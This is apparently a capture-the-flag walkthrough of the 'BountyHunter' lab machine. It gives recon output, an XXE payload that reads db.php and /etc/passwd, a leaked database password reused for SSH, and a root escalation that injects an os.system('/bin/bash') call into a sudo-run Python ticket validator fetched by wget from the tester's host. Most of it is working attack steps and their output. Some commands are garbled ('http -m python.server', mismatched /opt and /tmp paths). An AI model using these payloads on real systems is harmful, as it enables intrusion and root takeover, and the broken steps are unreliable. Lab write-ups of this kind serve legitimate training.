
#Room name BountyHunter 

	#nmap scan
```
# Nmap 7.91 scan initiated Thu Aug 26 17:54:15 2021 as: nmap -sC -sV -oN nmap.cap 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 26 17:55:07 2021 -- 1 IP address (1 host up) scanned in 51.86 seconds

```
	
	#Gobuster results
```
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]

```


	#We found tasks on 'http://10.10.11.100/resources/README.txt'

```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions

```

	#We found some interesting Directory 
```
http://10.10.11.100/log_submit.php
```


	#After capturing the request we find that here is xml XXE entity 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
```
	#In the first field use
```
&xxe;
```
	#We grab the db.php file having this information
```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
```
![Image](https://raw.githubusercontent.com/sigwotts/HTB-Walkthrough/main/bounty-hunter/Screenshot%202021-09-08%20at%203.56.36%20AM.png?token=AS3E3VMLGWIXHFH252PLCTTBHIZH6)



#But we tried using ssh it didn't worked, then we use to see the /etc/passwd file


	#First we have to encode this to url encoding then to base64
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>

		<bugreport>
		<title>&xxe;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>
```


	# By enocoding this to enoding url then to base64 and after replacing the request in the burpsuite, we get
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

``` 

	#Here we got the creds 
```
development:m19RoAU0hP41A1sTsq6K
```
#Boom we sucessfully login to the machine via ssh


	#Here we got the user flag
```
e83009fb0ded5f74b50aa794e0562246
```

	#Then we use 
```
sudo -l
```
```
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

```

#Now we can exploit by creating a file named as sig.md 
```
# Skytrain Inc   
## Ticket to root  
__Ticket Code:__  
**102 + 10 == 112 and __import__('os').system('/bin/bash') == False
``
	#Then start a python server on your machine
```
http -m python.server 1234
```

#Then upload this file in the /opt directory by using the cmd
```
wget http://10.10.14.157:1234/sig.md
```
	#Then we give permission to the file by 
```
chmod 777 sig.md
```

	#then run the tickerValidator.py
```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

	#specify the ticket path to
```
/tmp/sig.md
```
#BOOOOOOOOOOOOOOOOOOOMMMM!!!!!!!!!!!  WE ARE ROOT


	#Now you can get the flag
```
cat /root/root.txt
``
	#Here is the flag
```
0cc723be65032a28eadcc712c03defd5
```





